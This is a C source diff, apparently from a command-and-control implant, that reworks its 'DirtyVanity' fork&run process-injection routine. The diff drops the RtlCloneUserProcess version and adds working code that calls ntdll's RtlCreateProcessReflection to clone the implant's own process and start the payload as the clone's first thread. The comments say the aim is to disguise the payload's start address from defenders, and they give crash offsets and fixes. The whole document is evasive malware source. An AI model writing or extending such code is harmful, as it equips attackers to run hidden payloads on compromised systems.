@@ -25,6 +25,7 @@
 #include "functions.h"
 #include "bformat.h"
 #include "syscalls.h"
+#include "spawn_trace.h"
 
 #ifndef NTSTATUS
 typedef LONG NTSTATUS;
@@ -185,40 +186,79 @@ BOOL procinj_execute_has(BYTE opcode) {
 	}
 }
 
-/* 4.12 DirtyVanity fork&run: clone our own host process instead of spawning
- * a patsy, then run the payload through the normal inject chain (the clone's
- * initial thread arrives suspended, so SetThreadContext-style opcodes work).
- * Returns FALSE when cloning is unavailable so callers fall back to a patsy. */
-BOOL inject_dirtyvanity_forkrun(char * dll, int dllen, char * parameter, int plen) {
-	fRtlCloneUserProcess      pClone;
-	HANDLE                    hClone = NULL;
-	HANDLE                    hThread = NULL;
-	PROCESS_INFORMATION       pi;
-	INJECTCONTEXT             ctx;
+/* 4.12 DirtyVanity fork&run via RtlCreateProcessReflection. The original
+ * implementation called the raw ntdll!RtlCloneUserProcess primitive and
+ * then ran the normal execute chain inside the clone - but a raw clone
+ * lacks the loader bootstrap state a real process start gets, so every
+ * thread we minted in it AV'd inside ntdll during init (live: memset
+ * movaps at ntdll+0xa4778, deterministic) and calling the raw primitive
+ * from a managed host deadlocks outright (reproduced with ctypes/csc
+ * probes). The official DirtyVanity contract is the reflection API: it
+ * clones the target AND launches the clone's initial thread AT
+ * StartAddress, so the payload must simply live in the forked address
+ * space before the fork. New shape: inject_dirtyvanity_forkrun points
+ * the whole inject pipeline at OUR OWN process (local mirror + profile
+ * transforms), and the DirtyVanity opcode in the execute chain triggers
+ * the reflection - the clone inherits the mirrored payload and its very
+ * first thread runs it. Identical image to us, kernel-recorded start
+ * address inside that image: the whole point of the technique. */
+typedef struct _T2_RTL_PROCESS_REFLECTION_INFORMATION {
+	void * UniqueProcess; /* CLIENT_ID */
+	void * UniqueThread;
+	void * ReflectionProcessHandle;
+	void * ReflectionThreadHandle;
+} T2_REFLECTION_INFORMATION;
 
+typedef NTSTATUS(NTAPI *fRtlCreateProcessReflection)(void *, unsigned long, void *, void *, void *, T2_REFLECTION_INFORMATION *);
+
+static BOOL dv_reflect_fired = FALSE;
+
+BOOL inject_via_dirtyvanity_reflect(INJECTCONTEXT * context, LPVOID lpStartAddress, LPVOID lpParameter) {
+	fRtlCreateProcessReflection pReflect;
+	T2_REFLECTION_INFORMATION info;
+	NTSTATUS st;
+	HMODULE nt;
+
+	(void)lpParameter;
+
+	/* the fork clones the context's own process - only meaningful when the
+	 * pipeline targets us (the spawn-site contract) */
+	if (!context->samePid)
+		return FALSE;
+
+	nt = GetModuleHandleA("ntdll.dll");
+	if (nt == NULL)
+		return FALSE;
+	pReflect = (fRtlCreateProcessReflection)GetProcAddress(nt, "RtlCreateProcessReflection");
+	if (pReflect == NULL)
+		return FALSE;
+
+	ZeroMemory(&info, sizeof(info));
+	st = pReflect(GetCurrentProcess(),
+	              0x1 | 0x2, /* INHERIT_HANDLES | NO_SYNCHRONIZE (PoC flags) */
+	              lpStartAddress, lpParameter, NULL, &info);
+	if (st != 0) {
+		spawn_log("dv: reflection failed st=", (long)st);
+		post_error_d(0x4a, (int)st);
+		return FALSE;
+	}
+
+	spawn_log("dv: reflection fired, clone pid=", (long)(DWORD_PTR)info.UniqueProcess);
+	dv_reflect_fired = TRUE;
+	return TRUE;
+}
+
+BOOL inject_dirtyvanity_forkrun(char * dll, int dllen, char * parameter, int plen) {
 #if !defined _M_X64
 	return FALSE;
+#else
+	/* run the full pipeline against our own process: payload mirror,
+	 * profile transforms and the execute chain all apply; the chain's
+	 * DirtyVanity opcode (the same one that routed the spawn site here)
+	 * performs the fork&run trigger */
+	dv_reflect_fired = FALSE;
+	inject_process_logic(NULL, GetCurrentProcess(), GetCurrentProcessId(),
+	                     dll, dllen, 0, parameter, plen);
+	return dv_reflect_fired;
 #endif
-
-	pClone = (fRtlCloneUserProcess)GetProcAddress(GetModuleHandleA("ntdll.dll"), "RtlCloneUserProcess");
-	if (pClone == NULL) {
-		return FALSE;
-	}
-
-	if (pClone(CLONE_PROCESS_FLAGS, NULL, &hClone, &hThread) != 0 || hClone == NULL || hThread == NULL) {
-		return FALSE;
-	}
-
-	ZeroMemory(&pi, sizeof(pi));
-	pi.hProcess   = hClone;
-	pi.hThread    = hThread;
-	pi.dwProcessId = GetProcessId(hClone);
-
-	/* pi != NULL marks the context suspended (the clone's initial thread) */
-	populate_inject_context(&ctx, &pi, hClone, pi.dwProcessId);
-
-	/* run the configured execute chain inside the clone */
-	inject_process_logic(&pi, hClone, pi.dwProcessId, dll, dllen, 0, parameter, plen);
-
-	return TRUE;
 }
